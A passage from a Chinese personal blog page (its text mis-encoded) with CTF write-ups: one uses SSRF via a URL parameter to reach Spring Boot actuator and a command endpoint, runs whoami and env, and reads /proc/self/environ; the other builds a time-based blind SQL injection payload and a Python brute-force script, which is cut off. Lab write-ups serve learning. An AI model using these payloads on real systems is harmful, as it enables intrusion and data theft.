<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <title>ç™½ç™½æ¯›æ¯›</title>
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/_custom.css">
<meta name="generator" content="Hexo 8.1.1"></head>
<body class="bg-post">

<div class="sidebar">
    <div class="header-info">
        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
        <div class="site-author">ç™½ç™½æ¯›æ¯›</div>
    </div>
    <nav class="nav">
        <a href="/">é¦–é¡µ</a>
        <a href="/categories">åˆ†ç±»</a>
        <a href="/archives">æ‰€æœ‰</a>
    </nav>
    <div class="contact-section">
        <p>If you want find me:</p>
        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
    </div>
</div>

<div class="content-area">
    
<div style="height: 60px;"></div>
<div class="content-wrapper">
    <article class="post-article">
        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">PS:æ„Ÿè§‰å¯ä»¥åšä¸€ä¸ª</h1>
        
        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
            <span>ğŸ“… å‘å¸ƒ: 2025-11-11</span>
            <span style="margin: 0 15px;">|</span>
            <span style="color: #007bff; font-weight: bold;">ğŸ“ æ›´æ–°: 2026-01-02</span>
            
            
             <span style="margin: 0 15px;">|</span>
             ğŸ“‚ å­¦ä¹ 
            
        </div>
        
        <div class="article-content">
            <style>
/* æ¢å¤ä»£ç å—ä¸ºç­‰å®½å­—ä½“ï¼Œä½†å­—å·ä¸æ­£æ–‡ä¸€è‡´ï¼Œé¿å…è§†è§‰çªå˜ */
:root { --post-font-size: 1rem; }
/* å†…è”ä»£ç å’Œé”®ç›˜è¾“å…¥æ ·å¼ï¼šç­‰å®½ã€ä¸æ­£æ–‡åŒå¤§å° */
code, kbd, tt {
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
  font-size: var(--post-font-size) !important;
  font-weight: normal !important;
  background: rgba(0,0,0,0.03);
  padding: .06em .22em;
  border-radius: 4px;
}

/* å¤šè¡Œä»£ç å—ä¿ç•™ç­‰å®½å¹¶ä¼˜åŒ–æ¢è¡Œä¸å¯è¯»æ€§ */
pre, pre code, .highlight, .hljs {
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
  font-size: var(--post-font-size) !important;
  line-height: 1.6 !important;
  white-space: pre-wrap !important;     /* ä¿ç•™æ¢è¡ŒåŒæ—¶é¿å…æ¨ªå‘æ»šåŠ¨è¿‡å®½ */
  word-break: break-word !important;
  color: inherit !important;
  background: rgba(0,0,0,0.02);
  padding: .6em .8em !important;
  border-radius: 6px;
  overflow: auto !important;
}

/* å¦‚æœä¹‹å‰è¦†ç›–è¿‡æ›´å…·ä½“çš„ç±»ï¼ˆå¦‚ .language-xxxï¼‰ï¼Œä¹Ÿä¸€å¹¶æ¢å¤ */
.language-plaintext,
[class*="language-"],
.token {
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "DejaVu Sans Mono", monospace !important;
  font-size: var(--post-font-size) !important;
}
</style>

<h1 id="â€Java-Developerâ€-1"><a href="#â€Java-Developerâ€-1" class="headerlink" title="#â€Java Developerâ€ (1)"></a>#â€Java Developerâ€ (1)</h1><p><img src="/images/QQ20251111-175359.png" alt="alt text"></p>
<p>åœ¨çœ‹ä¹‹å‰ï¼Œæé†’ï¼Œéœ€è¦è‡ªå·±ç†è§£ä¸€ä¸‹é¢˜ç›®éœ€è¦ä½ å¹²ä»€ä¹ˆï¼Œè™½ç„¶è¿™æ˜¯æˆ‘ä¹‹å‰åšçš„ï¼Œä½†ä¸€äº›çŸ¥è¯†ç‚¹æ„Ÿè§‰è¿˜æ˜¯å¾ˆé‡è¦ï¼Œæ‰€ä»¥å°±å¿ƒè¡€æ¥æ½®å†™äº†ã€‚<br>é¶åœºwebé¢˜ï¼šâ€Java Developerâ€ (1)</p>
<p>æ‰“å¼€é¢˜ç›®æ‰€ç»™çš„é¶æœºï¼Œåªæœ‰è¿™ä¹ˆä¸€å¥è¯æ ¹æœ¬æ²¡æœ‰ä¸‹æ–‡ï¼Œä¸€å¼€å§‹å¾ˆéš¾æœ‰æ€è·¯çš„ï¼Œç”¨å·¥å…·æ‰«ä¸€ä¸‹ã€‚</p>
<blockquote>
<p>å¼€å§‹æ‰«æâ€¦â€¦<br><a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/robots.txt">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/robots.txt</a></p>
</blockquote>
<p>çœ‹åˆ°è¿™æœ‰ä¸ªrobots.txtï¼Œæ‰“å¼€çœ‹ä¸€ä¸‹</p>
<blockquote>
<p>User-agent: *<br>Disallow: &#x2F;backend&#x2F;*<br>Disallow: &#x2F;actuator&#x2F;*<br>Allow: &#x2F;front&#x2F;spider</p>
</blockquote>
<p>&#x2F;backend&#x2F;å’Œ&#x2F;actuator&#x2F;éƒ½è¢«ç¦æ­¢äº†ï¼Œè¯´æ˜è¿™ä¸¤ä¸ªé‡Œé¢è‚¯å®šæœ‰ä¸œè¥¿ã€‚<br>&#x2F;front&#x2F;spider åˆå…è®¸è¿™ä¸ªï¼Œæˆ–è®¸è¿™ä¸ªå¯ä»¥æ˜¯ä¸€ä¸ªè·³æ¿ã€‚</p>
<blockquote>
<p>æˆ‘ä»¬å…ˆæµ‹è¯•ä¸€ä¸‹ï¼š<br>C:\Users\G1731&gt;curl <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider</a><br>{â€œtimestampâ€:â€2025-11-11T09:59:53.995+0000â€,â€statusâ€:404,â€errorâ€:â€Not Foundâ€,â€messageâ€:â€No message availableâ€,â€pathâ€:â€&#x2F;front&#x2F;front&#x2F;spiderâ€}</p>
</blockquote>
<p>æˆ‘ä»¬è®¿é—®çš„æ˜¯&#x2F;front&#x2F;spiderï¼Œå¯å®ƒçš„åé¦ˆç¡®æ˜¯&#x2F;front&#x2F;front&#x2F;spiderï¼Œè¿™è¯´æ˜ä¸€å¼€å§‹æ‰€æœ‰è®¿é—®éƒ½æ˜¯åœ¨è¿™ä¸ª&#x2F;front&#x2F;ä¸‹è¿›è¡Œçš„ï¼Œè¢«å›ºå®šä½äº†ã€‚</p>
<p>æˆ‘ä»¬è¿™æ¬¡æ­£ç¡®è®¿é—®ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>bash<br>C:\Users\G1731&gt;curl <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider</a><br>å°è¯• <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider?url=https://www.baidu.com">ç‚¹å‡»æ­¤å¤„</p>
</blockquote>
<p>å®ƒè¿”å›äº†ä¸€ä¸ªé“¾æ¥ï¼Œçœ‹ä¸å‡ºä»€ä¹ˆæ„æ€ï¼Œæˆ‘ä»¬å†è®¿é—®ï¼š</p>
<blockquote>
<p>bash<br>C:\Users\G1731&gt;curl â€œhttp://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=https://www.baidu.com&quot;</p>
</blockquote>
<!DOCTYPE html><!--STATUS OK--><html> <head><meta http-equiv=content-type content=text/html;charset=utf-8>...ï¼ˆç™¾åº¦é¦–é¡µHTMLå†…å®¹ï¼‰...
<p>è¿™å½é‡Œå‘±å•¦çš„ä¸€å¤§å †ï¼Œå®Œå…¨ä¸æ‡‚æ„æ€ï¼Œä½†æˆ‘ä»¬åªè¦çŸ¥é“ä¸€ç‚¹ï¼Œè¿™ä¸ªåœ°å€æ˜¯ç™¾åº¦ï¼Œè€Œå®ƒåœ¨urlåé¢ï¼Œè¯´æ˜æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œå¹¶å¾—åˆ°åé¦ˆã€‚</p>
<p>å†æ‰«ä¸€ä¸‹ç«¯å£ï¼Œå‘ç°80æ˜¯å¼€æ”¾çš„ï¼Œå¤–ç½‘ç«¯å£å¼€æ”¾ä¸”èƒ½å‘å‡ºè¯·æ±‚ï¼Œé‚£æˆ‘ä»¬å†è¯•ä¸€è¯•å†…ç½‘ï¼š</p>
<blockquote>
<p>bash<br>C:\Users\G1731&gt;curl â€œhttp://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/&quot;<br>{â€œtimestampâ€:â€2025-11-11T10:09:34.482+0000â€,â€statusâ€:500,â€errorâ€:â€Internal Server Errorâ€,â€messageâ€:â€HTTPè¯·æ±‚å¤±è´¥ï¼Œå“åº”ç : 404â€,â€pathâ€:â€&#x2F;front&#x2F;spiderâ€}</p>
<p>C:\Users\G1731&gt;curl â€œhttp://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://127.0.0.1:8080/&quot;<br>{â€œtimestampâ€:â€2025-11-11T10:09:35.337+0000â€,â€statusâ€:500,â€errorâ€:â€Internal Server Errorâ€,â€messageâ€:â€HTTPè¯·æ±‚å¤±è´¥ï¼Œå“åº”ç : 404â€,â€pathâ€:â€&#x2F;front&#x2F;spiderâ€}</p>
</blockquote>
<p>æœ‰è¯·æ±‚è¯´æ˜ï¼Œ8080ç«¯å£æ˜¯å¼€çš„ï¼Œè€Œä¸”æœ‰å†…ç½‘ã€‚</p>
<p>æˆ‘ä»¬è¯•ä¸€ä¸‹ç”¨å†…ç½‘è®¿é—®åˆšæ‰å‡ ä¸ªç¦æ­¢ï¼š</p>
<blockquote>
<p>bash<br>C:\Users\G1731&gt;curl â€œhttp://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator&quot;<br>{â€œ_linksâ€:{â€œselfâ€:{â€œhrefâ€:â€http://localhost:8080/actuator&quot;,&quot;templated&quot;:false},&quot;health&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health&quot;,&quot;templated&quot;:false},&quot;health-path&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health/{*path}â€,â€templatedâ€:true},â€infoâ€:{â€œhrefâ€:â€http://localhost:8080/actuator/info&quot;,&quot;templated&quot;:false},&quot;mappings&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/mappings&quot;,&quot;templated&quot;:false}}}</p>
<p>C:\Users\G1731&gt;curl â€œhttp://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend&quot;<br>Nice! You will definitely succeed.</p>
</blockquote>
<p>è¿æ°”å¾ˆå¥½ï¼Œä¸€ä¸‹å­å°±è‚¯å®šäº†æˆ‘ä»¬çš„çŒœæƒ³ï¼Œæ–¹å‘æ˜¯å¯¹çš„ï¼Œé‚£ä¹‹åå‘¢ï¼Œå…¶å®è¿˜æ˜¯ä¸çŸ¥é“å…·ä½“è¦æ€ä¹ˆå»æ“ä½œï¼Œå»çœ‹äº†ç‚¹csdnï¼Œ</p>
<blockquote>
<p>https://blog.csdn.net/qq_43290288&#x2F;article&#x2F;details&#x2F;106296283</p>
</blockquote>
<p>å‘ç°è¿™ä¸ªactuatorå¾ˆå‰å®³ï¼Œå¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°å‘ç°æ‰€æœ‰ç›‘æ§ç‚¹çš„æ˜ å°„ä¿¡æ¯ï¼Œé‚£ä¸å°±è¯´æ˜å¯ä»¥æŸ¥çœ‹æ‰€æœ‰ä¸œè¥¿å—</p>
<p><img src="/images/QQ20251111-181803.png" alt="alt text"></p>
<blockquote>
<p>bash<br>C:\Users\G1731&gt;curl â€œ<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator/mappings">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator/mappings</a>â€œ<br>{â€œcontextsâ€:{â€œapplicationâ€:{â€œmappingsâ€:{â€œdispatcherServletsâ€:{â€œdispatcherServletâ€:[{â€œhandlerâ€:â€Actuator web endpoint â€˜healthâ€™â€,â€predicateâ€:â€{GET &#x2F;actuator&#x2F;health, produces [application&#x2F;vnd.spring-boot.actuator.v3+json || application&#x2F;vnd.spring-boot.actuator.v2+json || application&#x2F;json]}â€,â€detailsâ€:{â€œhandlerMethodâ€:{â€œclassNameâ€:â€org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandlerâ€,â€nameâ€:â€handleâ€,â€descriptorâ€:â€(Ljavax&#x2F;servlet&#x2F;http&#x2F;HttpServletRequest;Ljava&#x2F;util&#x2F;Map;)Ljava&#x2F;lang&#x2F;Object;â€},â€requestMappingConditionsâ€:{â€œconsumesâ€:[],â€headersâ€:[],â€methodsâ€:[â€œGETâ€],â€paramsâ€:[],â€patternsâ€:[â€œ&#x2F;actuator&#x2F;healthâ€],â€producesâ€:[{â€œmediaTypeâ€:â€application&#x2F;vnd.spring-boot.actuator.v3+jsonâ€,â€negatedâ€:false},{â€œmediaTypeâ€:â€application&#x2F;vnd.spring-boot.actuator.v2+jsonâ€,â€negatedâ€:false},{â€œmediaTypeâ€:â€application&#x2F;jsonâ€,â€negatedâ€:false}]}}},â€¦ï¼ˆå®Œæ•´çš„mappingså“åº”ï¼‰â€¦</p>
</blockquote>
<p>ä»€ä¹ˆéƒ½æ¥äº†ï¼Œä½†ä»€ä¹ˆä¹Ÿçœ‹ä¸æ‡‚ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦è¯·aiè€å¸ˆå¸®å¸®å¿™äº†ã€‚</p>
<blockquote>
<p>ä» mappings å“åº”ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æ‰€æœ‰åç«¯æ¥å£ï¼š</p>
<p>ğŸ”¥ BackendController æ¥å£ï¼š<br>&#x2F;backend&#x2F;file - æ–‡ä»¶è¯»å–åŠŸèƒ½<br>&#x2F;backend&#x2F;whoami - å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½<br>&#x2F;backend&#x2F;env - ç¯å¢ƒå˜é‡åŠŸèƒ½<br>&#x2F;backend - åŸºç¡€æ¥å£ï¼ˆè¿”å› â€œNice! You will definitely succeed.â€ï¼‰</p>
</blockquote>
<p>ä¸€é’ˆè§è¡€ï¼Œæˆ‘ä»¬å°±ç”¨è¿™å‡ ä¸ªç«¯å£æµ‹è¯•ä¸€ä¸‹ï¼š</p>
<blockquote>
<p>bash<br>C:\Users\G1731&gt;curl â€œ<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag</a>â€œ<br>ç¦»$FLAGå¾ˆè¿‘äº†å“¦</p>
<p>C:\Users\G1731&gt;curl â€œ<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ</a>â€œ<br>ç¦»$FLAGå¾ˆè¿‘äº†å“¦</p>
<p>C:\Users\G1731&gt;curl â€œ<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami</a>â€œ<br>root</p>
<p>C:\Users\G1731&gt;curl â€œ<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=env">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=env</a>â€œ<br>HOSTNAME&#x3D;a31cee05bb1eJAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8PWD&#x3D;&#x2F;HOME&#x3D;&#x2F;rootLANG&#x3D;C.UTF-8FLAG&#x3D;G0D{e03bef26-6922-4157-abed-8e979286cf98}SHLVL&#x3D;1PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binJAVA_VERSION&#x3D;8u342_&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;bin&#x2F;java</p>
</blockquote>
<p>Greatï¼ G0D{e03bef26-6922-4157-abed-8e979286cf98} ä¸€ä¸‹å­å°±æ‹¿åˆ°flagäº†ã€‚</p>
<p>è¯´å®è¯ï¼Œæˆ‘ä¸€å¼€å§‹åšçš„æ—¶å€™çœ‹äº†æ— æ•°éç¦»$FLAGå¾ˆè¿‘äº†å“¦å°±æ˜¯æ‰¾ä¸åˆ°flagï¼Œè¿˜ä»¥ä¸ºåšä¸å‡ºæ¥å‘¢ã€‚</p>
<p>å’•å’•å˜å˜ï¼ï¼ï¼</p>
<hr>
<h1 id="sql-manager-sys"><a href="#sql-manager-sys" class="headerlink" title="#sql_manager_sys"></a>#sql_manager_sys</h1><p><img src="/images/QQ20260102-140024.png" alt="alt text"></p>
<p>ç”±äºæœ€è¿‘éƒ½åœ¨å­¦sqlï¼Œæ‰€ä»¥å°±å°è¯•çœ‹çœ‹é¶åœºçš„é¢˜ç›®ã€‚</p>
<p>è¿™é¢˜è¿˜æ˜¯å¾ˆæœ‰éš¾åº¦çš„ï¼Œå®ƒä¸æ˜¯æˆ‘ç›®å‰æ¯”è¾ƒæœ‰å°è±¡çš„è”åˆæ³¨å…¥å’ŒæŠ¥é”™æ³¨å…¥ï¼Œåè€Œæ˜¯æ²¡é‚£ä¹ˆç†Ÿç»ƒçš„æ—¶é—´æ³¨å…¥ï¼Œæ‰€ä»¥è¿˜æ˜¯æœ‰ç”¨åˆ°aiè¾…åŠ©çš„ã€‚</p>
<p><img src="/images/QQ20260102-140332.png" alt="alt text"></p>
<p>ä¸€å¼€å§‹ç›´æ¥çœ‹é¢˜ç›®ï¼Œå…¶å®å°±æ˜¯å¾ˆæ­£å¸¸çš„ç™»å…¥é¡µé¢ï¼Œæˆ‘çš„æƒ³æ³•è¿˜æ˜¯ä¸æ˜¯æ³¨å…¥adminå°±æ˜¯æ³¨å…¥passwordï¼Œäºæ˜¯æˆ‘å…ˆç”¨bpæŠ“äº†ä¸ªåŒ…ã€‚</p>
<p><img src="/images/QQ20260102-140332.png" alt="alt text"></p>
<p>ä½ çœ‹ï¼Œå®ƒæ˜¯ä»¥ user&#x3D;???&amp;&amp;passwd&#x3D;??? çš„å½¢å¼ï¼Œä»¥POSTæ–¹å¼ï¼Œæäº¤åˆ°urlçš„check.phpã€‚</p>
<p>æ‰€ä»¥çŒœæµ‹æ•°æ®åº“ä¸­è‚¯å®šæœ‰userå’Œpasswdçš„è¡¨åï¼Œæ¯•ç«Ÿå®ƒæ˜¯è¦æ¯”è¾ƒæˆ‘æäº¤çš„è´¦å·å’Œå¯†ç æ˜¯å¦è·Ÿå®ƒè¡¨ä¸­çš„ç›¸åŒï¼Œæ‰ç®—æˆ‘ç™»å…¥æˆåŠŸã€‚</p>
<p>æƒ³äº†æƒ³ï¼Œæˆ‘å°±å…ˆä½¿ç”¨èµ·æ¥sqlmapã€‚</p>
<p>ä¸€ç•ªæ‰«æä¸‹æ¥ï¼Œå¯ä»¥è¯´æ˜¯å®Œå…¨æ²¡æœ‰æ”¶è·ï¼Œsqlmapåœ¨è¿™ç§éš¾åº¦é«˜çš„é¢˜ç›®é¢å‰ç›´æ¥å°±æ˜¯æ‘†è®¾ï¼Œåç«¯åªè¦éšæ³¢åŠ ä¸€ç‚¹ä¸œè¥¿ï¼Œsqlmapå°±ä¼šall failã€‚</p>
<p>æ²¡åŠæ³•ï¼Œæˆ‘å°±å…ˆæµ‹è¯•è¿™ä¸ªé¢˜ç›®åç«¯åˆ°åº•æ‹¦æˆªä»€ä¹ˆã€‚</p>
<p>ä¸€ç•ªcurlä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ã€‚</p>
<ul>
<li><strong>æ‹¦æˆªåå•</strong>ï¼š<code>SELECT</code>ã€<code>UNION</code>ã€<code>INFORMATION_SCHEMA</code>ã€<code>JOIN</code>ã€<code>AND</code>ã€<code>OR</code> ä»¥åŠå„ç§ç©ºæ ¼å˜ä½“ï¼ˆå¦‚ <code>%0a</code>ï¼‰ã€‚</li>
<li><strong>æ”¾è¡Œåå•</strong>ï¼š<code>SLEEP()</code>ã€<code>SUBSTR()</code>ã€<code>ASCII()</code>ã€<code>IF</code>ã€<code>||</code>ã€‚</li>
</ul>
<p>å¸¸è§„çš„æ³¨å…¥éƒ½éœ€è¦ <code>SELECT</code> æ¥æŸ¥è¯¢æ•°æ®ï¼Œæˆ–è€…ç”¨ <code>INFORMATION_SCHEMA</code> æ¥æŸ¥è¡¨åã€‚ç°åœ¨ <code>SELECT</code> è¢«å°æ­»ï¼ŒåŸºæœ¬å°±æ˜¯ç›´æ¥æ¦¨å¹²äº†ã€‚</p>
<p>ç»•è¿‡ä¹Ÿæ²¡æœ‰ï¼Œå˜ä½“ä¹Ÿå¤±è´¥ã€‚</p>
<p>selectè¿™æ¡è·¯ç›´æ¥å¤±è´¥ã€‚</p>
<p>å› ä¸ºæ˜¯æœ‰è´¦å·å’Œå¯†ç çš„è¾“å…¥æ¥å£ï¼Œæ‰€ä»¥çŒœæµ‹åå°æœ‰ç±»ä¼¼è¿™æ ·çš„æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE user=&#x27;$user&#x27; AND passwd=&#x27;$passwd&#x27;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¼•ç”¨å½“å‰è¡¨çš„åˆ—åè¿›è¡Œé€»è¾‘åˆ¤æ–­ï¼Œæ¯”å¦‚ï¼šå»¶æ—¶æµ‹è¯•ï¼Œå¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œç»“æœä¸º 1ï¼Œæ‰§è¡Œ <code>sleep(2.5)</code>ï¼›å¦‚æœä¸ºå‡ï¼Œç»“æœä¸º 0ï¼Œä¸å»¶æ—¶ã€‚</p>
<p>æ„é€  Payload å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nonexistent&#x27; || sleep(2.5 * (ascii(substr(database(),1,1))=99)) #</span><br></pre></td></tr></table></figure>

<p><strong>åŸç†</strong>ï¼šå¦‚æœæ•°æ®åº“åçš„ç¬¬ 1 ä½å­—ç¬¦æ˜¯ â€˜câ€™ (ascii 99)ï¼Œåˆ™ <code>1 * 2.5</code> è§¦å‘å»¶æ—¶ï¼›å¦åˆ™ä¸å»¶æ—¶ã€‚</p>
<p>å½“ç„¶äº†ï¼Œè¿™ä¸ªæ˜¯çˆ†ç ´æ–¹æ³•ï¼Œæˆ‘è‚¯å®šä¸èƒ½ä¸€ä¸ªä¸€ä¸ªå»å¡«ï¼Œè®©aiç»™æˆ‘äº†è„šæœ¬ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"># === é…ç½®åŒºåŸŸ ===</span><br><span class="line">url = &quot;http://18f25160-98b8-4fbe-b4b0-b55ffc1c6886.ctf.g0dsec.com/check.php&quot;</span><br><span class="line">sleep_time = 2.5  # è®¾ç½®å»¶è¿Ÿæ—¶é—´</span><br><span class="line"></span><br><span class="line"># å­—ç¬¦é›†ï¼šæ•°æ®åº“åé€šå¸¸ç”±å°å†™å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ç»„æˆ</span><br><span class="line">chars = string.ascii_lowercase + string.digits + &quot;_&quot;</span><br><span class="line"></span><br><span class="line">print(&quot;[*] å¼€å§‹çˆ†ç ´æ•°æ®åº“å...&quot;)</span><br><span class="line">print(f&quot;[*] ç›®æ ‡ URL: &#123;url&#125;&quot;)</span><br><span class="line">print(&quot;-&quot; * 50)</span><br><span class="line"></span><br><span class="line">db_name = &quot;&quot;</span><br><span class="line"></span><br><span class="line"># å‡è®¾æ•°æ®åº“åé•¿åº¦ä¸è¶…è¿‡ 20</span><br><span class="line">for i in range(1, 21):</span><br><span class="line">    found = False</span><br><span class="line">    for char in chars:</span><br><span class="line">        char_ord = ord(char)</span><br><span class="line">        </span><br><span class="line">        # === Payload æ„é€  ===</span><br><span class="line">        # åŸç†: user=&#x27;ä¸å­˜åœ¨&#x27; || (å¦‚æœ æ•°æ®åº“åç¬¬iä½æ˜¯char åˆ™ sleep(2.5)) #</span><br><span class="line">        # 1. nonexistent&#x27; : è®©å‰é¢çš„ user æŸ¥è¯¢å¤±è´¥ (False)</span><br><span class="line">        # 2. || : é€»è¾‘æˆ–ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥</span><br><span class="line">        # 3. ascii(substr(database(), i, 1)) : å–æ•°æ®åº“åç¬¬ i ä½å­—ç¬¦çš„ ASCII ç </span><br><span class="line">        # 4. * : ä¹˜æ³•è¿ç®—ã€‚å¦‚æœæ¡ä»¶ä¸ºçœŸ(1)ï¼Œåˆ™ sleep(2.5*1)ï¼›å¦‚æœä¸ºå‡(0)ï¼Œåˆ™ sleep(0)</span><br><span class="line">        </span><br><span class="line">        payload = f&quot;nonexistent&#x27;||(sleep(&#123;sleep_time&#125;*(ascii(substr(database(),&#123;i&#125;,1))=&#123;char_ord&#125;)))#&quot;</span><br><span class="line">        </span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;user&quot;: payload,</span><br><span class="line">            &quot;passwd&quot;: &quot;1&quot;  # å¯†ç éšä¾¿å¡«</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        try:</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            # å‘é€è¯·æ±‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ç•¥å°äº sleep_time</span><br><span class="line">            # å¦‚æœè¶…æ—¶ï¼Œè¯´æ˜æœåŠ¡å™¨ sleep äº†ï¼Œæ„å‘³ç€çŒœå¯¹äº†</span><br><span class="line">            requests.post(url, data=data, timeout=2)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            # æ•è·è¶…æ—¶å¼‚å¸¸ï¼Œè¯´æ˜çŒœå¯¹äº†</span><br><span class="line">            db_name += char</span><br><span class="line">            print(f&quot;[+] å‘ç°ç¬¬ &#123;i&#125; ä½å­—ç¬¦: &#123;char&#125;  |  å½“å‰æ•°æ®åº“å: &#123;db_name&#125;&quot;)</span><br><span class="line">            found = True</span><br><span class="line">            break</span><br><span class="line">        except Exception as e:</span><br><span class="line">            # å¤„ç†ç½‘ç»œé”™è¯¯ç­‰å…¶ä»–å¼‚å¸¸</span><br><span class="line">            pass</span><br><span class="line">            </span><br><span class="line">    if not found:</span><br><span class="line">        print(f&quot;\n[*] çˆ†ç ´ç»“æŸ (è¯¥ä½ç½®æœªåŒ¹é…åˆ°å­—ç¬¦ï¼Œå¯èƒ½é•¿åº¦å·²è¾¾ä¸Šé™)ã€‚&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span 